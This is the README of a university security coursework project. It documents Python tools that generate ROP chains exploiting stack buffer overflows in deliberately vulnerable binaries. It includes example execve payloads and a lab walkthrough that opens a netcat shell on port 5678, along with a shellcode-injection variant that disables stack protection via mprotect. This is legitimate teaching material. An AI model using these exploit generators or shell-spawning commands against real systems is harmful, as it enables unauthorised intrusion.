# COMSM0051 Systems and Software Security Coursework
## Project 4
### Group Members

This repository contains the source code created for the COMSM0051 Systems and Software Security unit at the University of Bristol.

The members of the group are:

* Ruairi Fox (rf17160)
* Bogdan Stelea (bs17580)
* Emil Centiu (zl18810)

## Instructions

### Prerequisites

The project has been developed and tested on a Ubuntu 18.04.5 LTS Bionic Beaver Virtual Machine. Please run the following commands to install all the packages needed to execute the project:

* `sudo apt-get update`
* `sudo apt-get install -y python3-pip gcc-multilib gdb`
* `pip3 install pygdbmi`
* `pip3 install ropgadget`

A Vagrantfile is also provided in the repository which will install automatically all the required packages on provision when initialising the VagrantBox `vagrant up`.
In order to use the Vagrantfile, the Vagrant and Oracle VirtualBox utilities need to be installed. 

In order to install VirtualBox please follow the instructions for specific Operating Systems [here](https://www.virtualbox.org/wiki/Downloads).
In order to install Vagrant please follow the instructions for specific Operating Systems [here](https://www.vagrantup.com/).

### Running `ropoverflow_execve.py`

The tool `ropoverflow_execve.py` is a Python3 program that given arbitrary command line arguments to be passed to the `execve()` system call automatically generates the corresponding ROP chain.

The program can be used as follows: `python3 ropoverflow_execve.py <binary name> <payload name>`, where `<binary name>` should be replaced with the compiled binary that is vulnerable to a stack buffer overflow exploit, e.g. `vuln3-32-test`, and `<binary name>` should be replaced with the name of the binary file that will contain the ROP chain, e.g. `exploit.bin`.

The program will also prompt the user to type the command line arguments to be passed to the `execve()` system call separated by whitespace (i.e. `" "`). The program will automatically detect if further `/` characters need to be inserted. 

Here are some example command line parameters that can be given as input when prompted:

* `/bin/sh`
* `/bin//sh`
* `/bin/sh ./exe/crl.sh`
* `/bin/sh ./exe/lyn.sh`
* `/tmp/nc -lnp 5678 -tte /bin/sh`
* `/tmp//nc -lnp 5678 -tte /bin//sh`

The program will generate a file having the same name as written by the user when executed corresponding to the `<payload name>` entry. This can be passed in as input to the vulnerable binary in order to inject the payload, for example `./vuln3-32-test exploit.bin`.

### Lab4 Reverse Shell Exploit Task Using `ropoverflow_execve.py`
#### Aim
Open a port on the victim machine using netcat tool that returns a shell (reverse shell exploit).
#### Steps
1. Change current directory to `s3` : `cd s3`
1. Copy netcat to temporary folder using `cp ~/netcat-0.7.1/src/netcat /tmp/nc` (check using `/tmp/nc --help`)
1. Compile vuln3.c using `gcc -fno-stack-protector -m32 -static vuln3.c -o vuln3-32-test` (the example binary is already compiled and present under the same name, `vuln3-32-test`, in the current directory)
1. Build the exploit input string using `python3 ropoverflow_execve.py vuln3-32-test exploit.bin`. When prompted with the message `"Enter exploit parameters:"` enter: `/tmp/nc -lnp 5678 -tte /bin/sh`
1. Run the compiled vulnerable binary passing the exploit file as input (e.g. `./vuln3-32 exploit.bin`)
1. In a separate terminal run `/tmp/nc 127.0.0.1 5678` and check if the reverse shell exploit is working

### Running `ropoverflow_execve.py` Evaluation
1. Change current directory to vulnerable_programs/: `cd ~/s3/vulnerable_programs`
1. (Optional) Delete binary files: `make clean`
1. Compile vulnerable binary files: `make all`
1. Return to project directory: `cd ..`
1. Create ROP-chain exploit file for a vulnerable binary: `python3 ropoverflow_execve.py ./vulnerable_programs/vuln3-32-0 exploit.bin`
1. Enter `execve` parameters when promted by the program: 
```
Enter exploit parameters: /bin/sh
```
1. Run vulnerable binary file with the exploit file as input: `./vulnerable_programs/vuln3-32-0 exploit.bin`
1. The program will return an interactive shell:
```
opening file
file opened
$
``` 
### Running `ropoverflow.py`

The tool `ropoverflow.py` is a Python3 program that given an arbitrary shellcode file will generate a ROP chain that will call the `mprotect` system call which will disable the `write-xor-execute` protection from the stack, and then will call the `read` system call to read the shellcode from the standard input, which will place the shellcode on the program stack, and then execute the payload.

The program is run with the command: `python3 ropoverflow.py <binary name> <payload name>`, , where `<binary name>` should be replaced with the compiled binary that is vulnerable to a stack buffer overflow exploit, e.g. `vuln3-32-test`, and `<binary name>` should be replaced with the name of the binary file that will contain the ROP chain, e.g. `exploit.bin`.

The shellcode needs to be saved in a binary file, for example `badfile`. Then the user can run the exploit by using the `cat` Linux utility to paste the content of the shellcode file to the terminal and append `-` to allow the program to process entries from standard input, and use the pipe (`|`) operator to pass the content of the file to the vulnerable binary that is being passed the payload file containing the ROP chain generated by the `ropoverflow.py` program. An example command looks like following: `cat badfile -| ./vuln3-32-test exploit.bin`. 
